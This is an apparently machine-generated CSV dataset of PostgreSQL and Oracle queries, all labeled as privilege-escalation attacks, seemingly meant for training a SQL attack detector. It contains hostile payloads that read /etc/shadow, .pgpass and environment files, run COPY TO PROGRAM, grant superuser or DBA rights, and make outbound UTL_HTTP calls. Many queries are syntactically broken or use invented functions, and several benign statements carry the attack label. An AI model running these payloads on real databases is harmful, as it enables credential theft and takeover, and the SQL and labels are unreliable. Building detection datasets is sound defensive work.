query,label,label_name,source
ALTER ROLE postgres SUPERUSER,3,privilege,generated_groq_postgresql_simple
EXECUTE 'pg_exportar /tmp/shadow /etc/shadow',3,privilege,generated_groq_postgresql_simple
SELECT pg_read_file('/etc/shadow'),3,privilege,generated_groq_postgresql_simple
lo_export '/etc/shadow' 'file.txt',3,privilege,generated_groq_postgresql_simple
CREATE EXTENSION IF NOT EXISTS plperl WITH SCHEMA public LANGUAGE plperl,3,privilege,generated_groq_postgresql_simple
"SELECT * FROM pg_shadow WHERE usename = 'postgres',",3,privilege,generated_groq_postgresql_advanced
COPY (/etc/passwd) TO STDOUT WITH csv DELIMITER ':' HEADER NULL 'NULL';,3,privilege,generated_groq_postgresql_advanced
SELECT pg_read_file('/etc/passwd');,3,privilege,generated_groq_postgresql_advanced
CREATE EXTENSION IF NOT EXISTS adminpack;,3,privilege,generated_groq_postgresql_advanced
DO $$ DECLARE curs CURSOR FOR SELECT rolname FROM pg_shadow; r RECORD; BEGIN FOR r IN curs LOOP EXECUTE 'ALTER ROLE ' || r.rolname || ' SUPERUSER;'; END LOOP; END $$;,3,privilege,generated_groq_postgresql_advanced
DO $$ DECLARE curs CURSOR FOR SELECT rolname FROM pg_shadow; r RECORD; BEGIN FOR r IN curs LOOP EXECUTE 'REASSIGN OWNED BY ' || r.rolname || ' TO postgres;'; END LOOP; END $$;,3,privilege,generated_groq_postgresql_advanced
CREATE EXTENSION IF NOT EXISTS file_fdw;,3,privilege,generated_groq_postgresql_advanced
"CREATE SERVER server FOR FOREIGN DATA WRAPPER file_fdw OPTIONS (FORMAT 'text', FILE '/etc/postgresql/13/main/postgresql.conf');",3,privilege,generated_groq_postgresql_advanced
CREATE FOREIGN TABLE file (data text) SERVER server;,3,privilege,generated_groq_postgresql_advanced
'\x' || pg_read_file('/etc/passwd')::bytea;,3,privilege,generated_groq_postgresql_advanced
SELECT lo_export(lo_import('/etc/passwd'));,3,privilege,generated_groq_postgresql_advanced
"DO $$ DECLARE c INT; v text; BEGIN c := pg_catalog.pg_file_length('/etc/passwd'); v := pg_catalog.pg_read_binary_file('/etc/passwd', c); RETURN v; END $$;",3,privilege,generated_groq_postgresql_advanced
CREATE TABLE pg_shadow AS SELECT * FROM pg_shadow;,3,privilege,generated_groq_postgresql_advanced
COPY (/proc/self/status) TO STDOUT WITH csv DELIMITER ':' HEADER NULL 'NULL';,3,privilege,generated_groq_postgresql_advanced
EXECUTE 'COPY (''' || pg_read_file('/etc/passwd') || ''') TO stdout WITH CSV HEADER';,3,privilege,generated_groq_postgresql_advanced
DO $$ DECLARE c CURSOR FOR SELECT rolname FROM pg_shadow; r RECORD; BEGIN FOR r IN curs LOOP CREATE EXTENSION IF NOT EXISTS pg_catalog.pg_fileio_for_r; END LOOP; END $$;,3,privilege,generated_groq_postgresql_advanced
"CREATE OR REPLACE FUNCTION psql_f() RETURNS TEXT AS $$
BEGIN
 RETURN pg_read_file('path_to_sensitive_file');
END;
$$ LANGUAGE plpgsql; CREATE OR REPLACE FUNCTION psql_f() AS 'SELECT psql_f()';
",3,privilege,generated_groq_postgresql_advanced
"SELECT lo_export(large_object_id, 'path_to_export_file');",3,privilege,generated_groq_postgresql_advanced
CREATE EXTENSION IF NOT EXISTS file_fdw; CREATE FOREIGN TABLE file_table(location TEXT) SERVER file_server FOREIGN DATA WRAPPER file_fdw; INSERT INTO file_table(location) VALUES('path_to_sensitive_file');,3,privilege,generated_groq_postgresql_advanced
"CREATE OR REPLACE FUNCTION pg_shadow_f() RETURNS TABLE(rolname TEXT, rolpass TEXT) AS $$ SELECT usename, passwd FROM pg_shadow; $$ LANGUAGE SQL; CREATE OR REPLACE FUNCTION get_shadow() RETURNS TABLE AS $$ SELECT rolname, rolpass FROM pg_shadow_f(); $$ LANGUAGE SQL;",3,privilege,generated_groq_postgresql_advanced
"CREATE OR REPLACE FUNCTION alter_superuser() RETURNS VOID AS $$
BEGIN
 PERFORM pg_update('UPDATE pg_roles SET rolsuper = TRUE WHERE rolname = ''postgres'''); RETURN;
END;
$$ LANGUAGE plpgsql; CALL alter_superuser();",3,privilege,generated_groq_postgresql_advanced
SELECT * FROM ( SELECT * FROM pg_shadow ) AS subquery WHERE usename = 'postgres';,3,privilege,generated_groq_postgresql_advanced
WITH RECURSIVE recursive_query AS ( SELECT rolname FROM pg_shadow UNION ALL SELECT rolname FROM recursive_query ) SELECT * FROM recursive_query;,3,privilege,generated_groq_postgresql_advanced
"CREATE OR REPLACE FUNCTION lo_export_f() RETURNS VOID AS $$ SELECT lo_export(large_object_id, 'path_to_export_file'); $$ LANGUAGE SQL; CREATE OR REPLACE FUNCTION get_export() RETURNS TABLE AS $$ SELECT lo_export_f(); $$ LANGUAGE SQL;",3,privilege,generated_groq_postgresql_advanced
SELECT pg_read_file('path_to_sensitive_file') INTO file_contents;,3,privilege,generated_groq_postgresql_advanced
CREATE EXTENSION IF NOT EXISTS 'tablefunc'; CREATE TABLE pg_shadow_table AS SELECT * FROM pg_catalog.pg_shadow;,3,privilege,generated_groq_postgresql_advanced
SELECT * FROM ( SELECT * FROM pg_shadow ) AS subquery WHERE rolname = 'postgres' AND rolsuper = TRUE;,3,privilege,generated_groq_postgresql_advanced
CREATE OR REPLACE FUNCTION pg_catalog.pg_read_file_s() RETURNS TEXT AS $$ SELECT pg_read_file('path_to_sensitive_file'); $$ LANGUAGE SQL; SELECT * FROM pg_catalog.pg_read_file_s();,3,privilege,generated_groq_postgresql_advanced
"WITH RECURSIVE recursion AS ( SELECT pg_shadow.usename, pg_shadow.rolpass FROM pg_shadow WHERE rolname = 'postgres' UNION ALL SELECT pg_shadow.rolname, pg_shadow.rolpass FROM recursion JOIN pg_shadow ON recursion.usename = pg_shadow.rolname ) SELECT * FROM recursion;",3,privilege,generated_groq_postgresql_advanced
"CREATE EXTENSION IF NOT EXISTS 'plv8'; CREATE OR REPLACE FUNCTION execute_query() RETURNS TABLE AS $$
BEGIN
 RETURN QUERY SELECT pg_read_file('path_to_sensitive_file');
END;
$$ LANGUAGE plv8; CALL execute_query();",3,privilege,generated_groq_postgresql_advanced
"CREATE EXTENSION IF NOT EXISTS 'plpgsql'; CREATE OR REPLACE FUNCTION psql_func_f() RETURNS TEXT AS $$
BEGIN
 RETURN pg_read_file('path_to_sensitive_file');
END;
$$ LANGUAGE plpgsql;",3,privilege,generated_groq_postgresql_advanced
REVOKE ALL PRIVILEGES ON ALL TABLES IN SCHEMA public FROM public; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO public;,3,privilege,generated_groq_postgresql_advanced
"CREATE OR REPLACE FUNCTION copy_from_program() RETURNS TABLE AS $$
BEGIN
 EXECUTE 'COPY (SELECT pg_read_file(' || ''' || '' || pg_read_file('path_to_sensitive_file') || '' || ''' || ''')) TO ''path_to_copy_file'' WITH CSV HEADER;',
 RETURN QUERY SELECT * FROM ' || '''' || '''' || ''path_to_copy_file'' || '''' || '''';
END;
$$ LANGUAGE plpgsql;",3,privilege,generated_groq_postgresql_advanced
COPY TO PROGRAM 'sh /etc/passwd | cat',3,privilege,generated_groq_postgresql_advanced
"CREATE EXTENSION IF NOT EXISTS postgres_fdw; CREATE FOREIGN DATA WRAPPER postgres_fdw; CREATE SERVER postgres_server FOREIGN DATA WRAPPER postgres_fdw OPTIONS (dbname 'postgres', host 'localhost', port '5432', user 'postgres', password 'yourpwd');",3,privilege,generated_groq_postgresql_advanced
SELECT * FROM pg_catalog.pg_class WHERE oid = (SELECT c.oid FROM pg_catalog.pg_roles r JOIN pg_catalog.pg_class c ON r.rolowner = c.relowner WHERE r.rolname = 'postgres');,3,privilege,generated_groq_postgresql_advanced
ALTER ROLE postgres SET default_transaction_idempotent TO OFF; ALTER ROLE postgres WITH PASSWORD 'yourpwd';,3,privilege,generated_groq_postgresql_advanced
"SELECT lo_export(pg_catalog.pg_lsn_get_active_xid(), '/path/to/export');",3,privilege,generated_groq_postgresql_advanced
WITH RECURSIVE pw AS (SELECT p.rolpassword FROM pg_shadow p WHERE p.usename = 'postgres' UNION ALL SELECT p.rolpassword FROM pg_shadow p JOIN pw ON p.rolpassword = pw.rolpassword) SELECT * FROM pw LIMIT 1;,3,privilege,generated_groq_postgresql_advanced
CREATE EXTENSION IF NOT EXISTS file_fdw; CREATE FOREIGN TABLE file FROM 'SELECT * FROM /etc/passwd' USING file_fdw; SELECT * FROM file;,3,privilege,generated_groq_postgresql_advanced
"SELECT pg_read_file('/etc/group', 1);",3,privilege,generated_groq_postgresql_advanced
"WITH RECURSIVE pw AS (SELECT p.rolpassword FROM pg_shadow p WHERE p.usename = 'postgres' UNION ALL SELECT p.rolpassword FROM pg_shadow p JOIN pw ON p.rolpassword = pw.rolpassword) SELECT pg_read_file('/etc/passwd',1) AS res FROM pw LIMIT 1;",3,privilege,generated_groq_postgresql_advanced
"SELECT pg_read_file('/etc/shadow',",3,privilege,generated_groq_postgresql_advanced
(SELECT rolpassword FROM pg_shadow p WHERE p.usename = 'postgres');,3,privilege,generated_groq_postgresql_advanced
"CREATE EXTENSION IF NOT EXISTS postgres_fdw; CREATE FOREIGN DATA WRAPPER postgres_fdw; CREATE SERVER postgres_server FOREIGN DATA WRAPPER postgres_fdw OPTIONS (dbname 'postgres', host 'localhost', port '5432', user 'postgres', password 'yourpwd'); ALTER SERVER postgres_server SET peerauth TO TRUE;",3,privilege,generated_groq_postgresql_advanced
"SELECT lo_export(pg_catalog.pg_lsn_get_active_xid(), '/path/to/export' || pg_read_file('/etc/passwd')), pg_read_file('/etc/passwd');",3,privilege,generated_groq_postgresql_advanced
"SELECT CREATE EXTENSION IF NOT EXISTS file_fdw; CREATE FOREIGN TABLE file FROM 'SELECT * FROM /etc/passwd' USING file_fdw; SELECT pg_read_file('file',1);",3,privilege,generated_groq_postgresql_advanced
SELECT pg_shadow.rolpassword FROM pg_shadow WHERE pg_shadow.rolname = 'postgres';,3,privilege,generated_groq_postgresql_advanced
SELECT * FROM pg_shadow p JOIN (SELECT p.rolpassword FROM pg_shadow p WHERE p.usename = 'postgres' UNION ALL SELECT p.rolpassword FROM pg_shadow p JOIN pw ON p.rolpassword = pw.rolpassword) pw ON p.rolpassword = pw.rolpassword;,3,privilege,generated_groq_postgresql_advanced
ALTER ROLE postgres SET default_transaction_idempotent TO OFF; ALTER ROLE postgres SET SUPERUSER TO TRUE;,3,privilege,generated_groq_postgresql_advanced
WITH RECURSIVE pw AS (SELECT p.rolpassword FROM pg_shadow p WHERE p.usename = 'postgres' UNION ALL SELECT p.rolpassword FROM pg_shadow p JOIN pw ON p.rolpassword = pw.rolpassword) SELECT pg_read_file('/proc/self/environ' ) AS res FROM pw LIMIT 1;,3,privilege,generated_groq_postgresql_advanced
"SELECT pg_read_file('/proc/self/environ', 1);",3,privilege,generated_groq_postgresql_advanced
"COPY TO PROGRAM 'echo ""SELECT pg_isuperuser()"" | psql -U postgres';",3,privilege,generated_groq_postgresql_advanced
SELECT INTO OUTFILE '/tmp/pwned.txt' FROM pg_read_file('/etc/shadow');,3,privilege,generated_groq_postgresql_advanced
CREATE EXTENSION IF NOT EXISTS unaccent USING password 'pwned';,3,privilege,generated_groq_postgresql_advanced
"SELECT usename, usesysid FROM pg_shadow WHERE usename = 'postgres';",3,privilege,generated_groq_postgresql_advanced
ALTER ROLE postgres SUPERUSER PASSWORD 'pwned';,3,privilege,generated_groq_postgresql_advanced
"SELECT pg_read_file('/etc/passwd', 1024, 1024) as foo FROM dual LIMIT 1;",3,privilege,generated_groq_postgresql_advanced
"SELECT (array(SELECT pg_read_file('/etc/shadow', i*4096, 4096) FROM generate_series(1,2))) FROM dual;",3,privilege,generated_groq_postgresql_advanced
SELECT pg_read_file('/proc/self/environ');,3,privilege,generated_groq_postgresql_advanced
"SELECT lo_export(lo_open('PG_tmp/123', 131072) + 1024, 'out.txt', 131072);",3,privilege,generated_groq_postgresql_advanced
"SELECT INTO OUTFILE '/tmp/pwned2.txt' FROM pg_read_file('/etc/group', 4096, 4096) LIMIT 1;",3,privilege,generated_groq_postgresql_advanced
"SELECT (select string_agg((SELECT pg_read_file('/etc/group', i*4096, 4096) FROM generate_series(1,2)), '
') FROM dual) FROM dual;",3,privilege,generated_groq_postgresql_advanced
SELECT INTO OUTFILE '/tmp/pwned3.txt' FROM pg_read_file('/etc/passwd') LIMIT 1;,3,privilege,generated_groq_postgresql_advanced
"SELECT INTO OUTFILE '/tmp/pwned4.txt' FROM generate_series(0,1000000) WHERE (SELECT pg_read_file('/etc/shadow', 4096*i+1024, 4096) FROM dual) LIKE '%pwned%';",3,privilege,generated_groq_postgresql_advanced
SELECT INTO OUTFILE '/tmp/pwned5.txt' FROM pg_read_file('/etc/hosts');,3,privilege,generated_groq_postgresql_advanced
"SELECT INTO outfile '/tmp/pwned6.txt' FROM pg_read_file('/etc/group', 4096, 4096) WHERE usename LIKE '%pwned%';",3,privilege,generated_groq_postgresql_advanced
"SELECT INTO OUTFILE '/tmp/pwned7.txt' FROM (SELECT * FROM pg_read_file('/etc/sudoers', 4096, 4096)) WHERE host LIKE '%pwned%';",3,privilege,generated_groq_postgresql_advanced
"SELECT INTO OUTFILE '/tmp/pwned8.txt' FROM generate_series(1,1000000) WHERE (select pg_read_file('/etc/group', 4096*i+4096, 4096) FROM dual) LIKE 'pwned%', '%';",3,privilege,generated_groq_postgresql_advanced
SELECT ((SELECT pg_read_file('/proc/self/environ'))||'|'||pg_read_file('/etc/passwd'));,3,privilege,generated_groq_postgresql_advanced
WITH pwned AS (SELECT pg_read_file('/etc/group')) SELECT * FROM pwned LIMIT 1;,3,privilege,generated_groq_postgresql_advanced
"COPY TO/FROM PROGRAM: SELECT pg_catalog.pg_catalog.pg_read_file('/var/lib/postgresql/.pgpass'); COPY (SELECT pg_catalog.pg_catalog.pg_read_file('/var/lib/postgresql/.pgpass') as s) TO '/tmp/pass.txt' WITH CSV HEADER DELIMITER ',';",3,privilege,generated_groq_postgresql_advanced
pg_read_file: DROP FUNCTION IF EXISTS pg_catalog.pg_read_file(text); CREATE OR REPLACE FUNCTION pg_catalog.pg_read_file(text) RETURNS text AS $$ SELECT pg_catalog.pg_backend_pid() || $1 $$ LANGUAGE SQL IMMUTABLE; SELECT pg_catalog.pg_read_file('/etc/shadow');,3,privilege,generated_groq_postgresql_advanced
"CREATE EXTENSION: CREATE EXTENSION IF NOT EXISTS pgcrypto; CREATE TABLE test ( id SMALLINT, name VARCHAR(30) ) WITH (STORAGE = pg_lzo); ALTER TABLE test OWNER TO postgres;",3,privilege,generated_groq_postgresql_advanced
pg_shadow access: SELECT * FROM pg_shadow WHERE usename = 'postgres';,3,privilege,generated_groq_postgresql_advanced
ALTER ROLE SUPERUSER: ALTER ROLE postgres WITH SUPERUSER;,3,privilege,generated_groq_postgresql_advanced
"lo_export: SELECT lo_export(loid, '/tmp/lo_export_file.txt') FROM pg_largeobject_metadata WHERE loid = pg_largeobjectMetadata.loid ORDER BY pg_largeobjectMetadata.loid LIMIT 1;",3,privilege,generated_groq_postgresql_advanced
"COPY TO/FROM PROGRAM + LoC: DO $do$ BEGIN COPY (SELECT pg_catalog.pg_backend_pid() || pg_read_file('/etc/passwd')) TO '/tmp/pass2.txt' WITH CSV HEADER DELIMITER ','; END $do$;",3,privilege,generated_groq_postgresql_advanced
CREATE EXTENSION + pg_shadow access: DO $do$ BEGIN CREATE EXTENSION IF NOT EXISTS regprocedure; CREATE OR REPLACE FUNCTION my_function() RETURNS regprocedure AS $$ SELECT * FROM pg_catalog.pg_function_info WHERE proname = 'pg_read_file' $$ LANGUAGE SQL; SELECT * FROM pg_shadow WHERE usename = 'postgres'; END $do$;,3,privilege,generated_groq_postgresql_advanced
"CREATE TABLE with special columns: CREATE TABLE test ( id SMALLINT, name VARCHAR(30) ); CREATE TABLE test2 ( id INTEGER, name TEXT DEFAULT pg_read_file('/etc/passwd') );",3,privilege,generated_groq_postgresql_advanced
"CTE with pg_shadow access: WITH cte AS ( SELECT usename, usesysid FROM pg_shadow ) SELECT * FROM cte WHERE usename = 'postgres';",3,privilege,generated_groq_postgresql_advanced
"multi-step: DO $$ BEGIN CREATE TABLE test ( id SMALLINT, name VARCHAR(30) ); ALTER TABLE test OWNER TO postgres; SELECT * FROM pg_shadow WHERE usename = 'postgres'; DROP TABLE test; END $$; SELECT lo_export(loid, '/tmp/lo_export_file.txt') FROM pg_largeobject_metadata WHERE loid = pg_largeobjectMetadata.loid ORDER BY pg_largeobjectMetadata.loid LIMIT 1;",3,privilege,generated_groq_postgresql_advanced
Evasion technique with double quotes: DO $do$ BEGIN CREATE EXTENSION IF NOT EXISTS ,3,privilege,generated_groq_postgresql_advanced
CREATE OR REPLACE DIRECTORY temp_dir AS '/path/to/temp/dir';,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE temp_proc AS BEGIN UTL_FILE.FOPEN('temp_dir/temp_file'); END;,3,privilege,generated_groq_oracle_simple
GRANT CREATE SESSION TO PUBLIC;,3,privilege,generated_groq_oracle_simple
GRANT CREATE PROCEDURE TO PUBLIC;,3,privilege,generated_groq_oracle_simple
"BEGIN SYS.DBMS_SCHEDULER.CREATE_JOB('temp_job', UTL_HTTP.REQUEST('http://example.com')); END;",3,privilege,generated_groq_oracle_simple
BEGIN UTL_HTTP.HTTP_REQUEST('http://example.com'); END;,3,privilege,generated_groq_oracle_simple
GRANT CONNECT TO PUBLIC;,3,privilege,generated_groq_oracle_simple
GRANT RESOURCE TO PUBLIC;,3,privilege,generated_groq_oracle_simple
"BEGIN DBMS_SCHEDULER.CREATE_JOB('temp_job', 'BEGIN UTL_FILE.PUT_LINE(''test''); END;'); END;",3,privilege,generated_groq_oracle_simple
"BEGIN DBMS_SCHEDULER.CREATE_JOB('temp_job', 'BEGIN UTL_HTTP.REQUEST(''http://example.com''); END;'); END;",3,privilege,generated_groq_oracle_simple
"BEGIN DBMS_SCHEDULER.CREATE_JOB('temp_job', 'BEGIN DBMS_OUTPUT.PUT_LINE(''test''); END;'); END;",3,privilege,generated_groq_oracle_simple
"BEGIN DBMS_SCHEDULER.CREATE_JOB('temp_job', 'BEGIN UTL_FILE.FOPEN(''temp_dir/temp_file''); END;'); END;",3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE temp_proc AS BEGIN UTL_FILE.PUT_LINE('test'); END;,3,privilege,generated_groq_oracle_simple
GRANT EXECUTE ON SYSTABLEPRIV TO PUBLIC;,3,privilege,generated_groq_oracle_simple
GRANT DBA TO temp_user;,3,privilege,generated_groq_oracle_simple
"BEGIN DBMS_SCHEDULER.CREATE_JOB('temp_job', 'BEGIN SYS.ALL_TABLES; END;'); END;",3,privilege,generated_groq_oracle_simple
GRANT CREATE ANY PROCEDURE TO temp_user;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE temp_proc AS BEGIN GRANT DBA TO temp_user; END;,3,privilege,generated_groq_oracle_simple
"SELECT UTL_FILE.FOPEN('','w') FROM DUAL;",3,privilege,generated_groq_oracle_simple
"SELECT DBMS_SCHEDULER.CREATE_JOB('my_job','UTL_HTTP.REQUEST('http://www.google.com')');",3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE test_proc AS BEGIN UTL_HTTP.REQUEST('http://www.google.com'); END;,3,privilege,generated_groq_oracle_simple
"CREATE OR REPLACE PROCEDURE test_proc AS BEGIN DBMS_SCHEDULER.CREATE_JOB('my_job','UTL_HTTP.REQUEST('http://www.google.com')'); END;",3,privilege,generated_groq_oracle_simple
SELECT DBA_SYS_PRIVS WHERE privilege='CREATE_PROCEDURE'; GRANT CREATE PROCEDURE TO user;,3,privilege,generated_groq_oracle_simple
"CREATE OR REPLACE PACKAGE auth_pkg IS PROCEDURE test_proc; END; CREATE OR REPLACE PACKAGE BODY auth_pkg IS PROCEDURE test_proc AS BEGIN DBMS_SCHEDULER.CREATE_JOB('my_job','UTL_HTTP.REQUEST('http://www.google.com')'); END; END;",3,privilege,generated_groq_oracle_simple
"SELECT * FROM SYS.ALL_TABLES; SELECT UTL_FILE.FOPEN('','w');",3,privilege,generated_groq_oracle_simple
GRANT DBA TO user;,3,privilege,generated_groq_oracle_simple
"DECLARE l_objid NUMBER;  l_cnt NUMBER; BEGIN SELECT COUNT(*) INTO l_cnt FROM sys.all_tables WHERE TABLE_NAME LIKE 'V%'; UTL_FILE.FOPEN('','w'); END;",3,privilege,generated_groq_oracle_simple
"SELECT UTL_FILE.FOPEN('','w') FROM DUAL; SELECT DBMS_SCHEDULER.CREATE_JOB('my_job','UTL_HTTP.REQUEST('http://www.google.com')');",3,privilege,generated_groq_oracle_simple
SELECT * FROM ALL_USERS WHERE username LIKE '%test%'; SELECT UTL_HTTP.REQUEST('http://www.google.com');,3,privilege,generated_groq_oracle_simple
SELECT * FROM SYS.ALL_TABLES WHERE TABLE_NAME LIKE 'V%'; GRANT CREATE PROCEDURE TO user;,3,privilege,generated_groq_oracle_simple
SELECT UTL_HTTP.REQUEST('http://www.google.com'); CREATE OR REPLACE PROCEDURE test AS BEGIN UTL_HTTP.REQUEST('http://www.google.com'); END;,3,privilege,generated_groq_oracle_simple
"SELECT * FROM ALL_TABLES WHERE TABLE_NAME LIKE '%SOMETHING%'; SELECT UTL_FILE.FOPEN('','w');",3,privilege,generated_groq_oracle_simple
SELECT UTL_HTTP.REQUEST('http://www.google.com'); GRANT CREATE PROCEDURE TO user;,3,privilege,generated_groq_oracle_simple
"SELECT DBMS_SCHEDULER.CREATE_JOB('my_job','UTL_HTTP.REQUEST('http://www.google.com')'); GRANT DBA TO user;",3,privilege,generated_groq_oracle_simple
DECLARE l_cnt NUMBER;  l_objid NUMBER; BEGIN SELECT COUNT(*) INTO l_cnt FROM sys.all_tables WHERE TABLE_NAME LIKE 'V%'; UTL_HTTP.REQUEST('http://www.google.com'); END;,3,privilege,generated_groq_oracle_simple
"SELECT UTL_FILE.write('/tmp/output', 'Sensitive data'||LPAD(1, 10, '0')) FROM DUAL",3,privilege,generated_groq_oracle_simple
"EXEC DBMS_SCHEDULER.CREATE_JOB('Sensitive job', 'Sensitive procedure', '0 0 */1 * *')",3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE SensitiveProcedure AS BEGIN CREATE PROCEDURE SensitiveProcedure; END;,3,privilege,generated_groq_oracle_simple
GRANT CREATE ANY PROCEDURE TO PUBLIC,3,privilege,generated_groq_oracle_simple
GRANT DBA TO ANONYMOUS,3,privilege,generated_groq_oracle_simple
SELECT SYS.ALL_TABLES FROM DUAL,3,privilege,generated_groq_oracle_simple
SELECT SYS.ALL_TABLES FROM DUAL OVERWRITE /tmp/ sensitive_data,3,privilege,generated_groq_oracle_simple
SELECT banner FROM v$version WHERE banner LIKE '%Oracle%';--UMLUTS,3,privilege,generated_groq_oracle_simple
GRANT CREATE ANY DATABASE LINK TO PUBLIC,3,privilege,generated_groq_oracle_simple
GRANT CREATE SESSION TO PUBLIC IN DATABASE LINK /tmp/ public_link,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE LIBRARY SensitiveLibrary AS DBMS_TYPES,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE FUNCTION SensitiveFunction RETURN NUMBER AS BEGIN RETURN 1; END;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE SensitiveProcedure AS BEGIN EXEC sys.dbms_sql.parse( 'Sensitive query'); END;,3,privilege,generated_groq_oracle_simple
SELECT sys.dbms_sql.parse( 'SELECT SYS.ALL_TABLES FROM DUAL') FROM DUAL,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE DIRECTORY SensitiveDirectory AS '/tmp/ sensitive_dir';,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE DIRECTORY SensitiveDirectory AS '/etc/ password_file';,3,privilege,generated_groq_oracle_simple
GRANT DIRECTORY OBJECT ACCESS TO PUBLIC ON DIRECTORY SensitiveDirectory,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE DIRECTORY SensitiveDirectory AS '/tmp/ public_dir';,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE DIRECTORY SensitiveDirectory AS '/etc/ shadow';,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE DIRECTORY test AS '/tmp';,3,privilege,generated_groq_oracle_simple
"CREATE OR REPLACE PROCEDURE test_proc AS BEGIN UTL_FILE.FOPEN('test','write'); END;",3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE FUNCTION test_func RETURN VARCHAR2 AS BEGIN UTL_HTTP.REQUEST('http://example.com/test.txt'); END;,3,privilege,generated_groq_oracle_simple
"BEGIN DBMS_SCHEDULER.CREATE_JOB('test_job','BEGIN DBMS_OUTPUT.PUT_LINE('Test job'); END;',SYSTIMESTAMP,'SYSTIMESTAMP','INTERVAL '1' MINUTE',TRUE); END;",3,privilege,generated_groq_oracle_simple
GRANT DBA TO PUBLIC;,3,privilege,generated_groq_oracle_simple
SELECT OBJECT_NAME FROM SYS.ALL_TABLES WHERE OWNER='SYS' AND OBJECT_TYPE='TABLE';,3,privilege,generated_groq_oracle_simple
SELECT OWNER FROM SYS.ALL_TABLES WHERE OBJECT_NAME='test_table';,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE test_priv AS BEGIN DBMS_OUTPUT.PUT_LINE(sys.dual.object_id); END;,3,privilege,generated_groq_oracle_simple
"BEGIN DBMS_SCHEDULER.CREATE_JOB('test_job','BEGIN UTL_FILE.PUT_LINE('test'); END;',SYSTIMESTAMP,'SYSTIMESTAMP','INTERVAL '1' MINUTE',TRUE); END;",3,privilege,generated_groq_oracle_simple
DECLARE x NUMBER; BEGIN x := UTL_HTTP.REQUEST('http://example.com/test.txt'); END;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE FUNCTION test_func RETURN NUMBER AS BEGIN RETURN UTL_HTTP.REQUEST('http://example.com/test.txt'); END;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE DIRECTORY priv_dir AS '/tmp'; GRANT READ ON DIRECTORY priv_dir TO PUBLIC;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE VIEW test_view AS SELECT 'test' FROM dual;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE SYNONYM priv_syn FOR SYS.ALL_TABLES;,3,privilege,generated_groq_oracle_simple
GRANT SELECT ANY TABLE TO PUBLIC;,3,privilege,generated_groq_oracle_simple
GRANT SELECT ANY DICTIONARY TO PUBLIC;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PACKAGE test_pkg AS PROCEDURE test_proc; END test_pkg;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE TYPE test_typ AS OBJECT (test NUMBER);,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE TYPE test_typ AS TABLE OF NUMBER;,3,privilege,generated_groq_oracle_simple
GRANT EXECUTE ON UTL_FILE TO PUBLIC;,3,privilege,generated_groq_oracle_simple
"CREATE OR REPLACE PROCEDURE utl_file_ex AS BEGIN UTL_FILE.FOPEN('tmp', 'r'); END;",3,privilege,generated_groq_oracle_simple
SELECT UTL_HTTP.send_req('http://example.com') FROM DUAL;,3,privilege,generated_groq_oracle_simple
BEGIN DBMS_SCHEDULER.CREATE_JOB('my_job'); END;,3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE my_procedure AS BEGIN CREATE TABLE test (id NUMBER); END;,3,privilege,generated_groq_oracle_simple
DROP TABLE DBMS_SCHEDULER.BOOTSTRAP;,3,privilege,generated_groq_oracle_simple
GRANT DBA TO my_user;,3,privilege,generated_groq_oracle_simple
SELECT * FROM SYS.ALL_TABLES;,3,privilege,generated_groq_oracle_simple
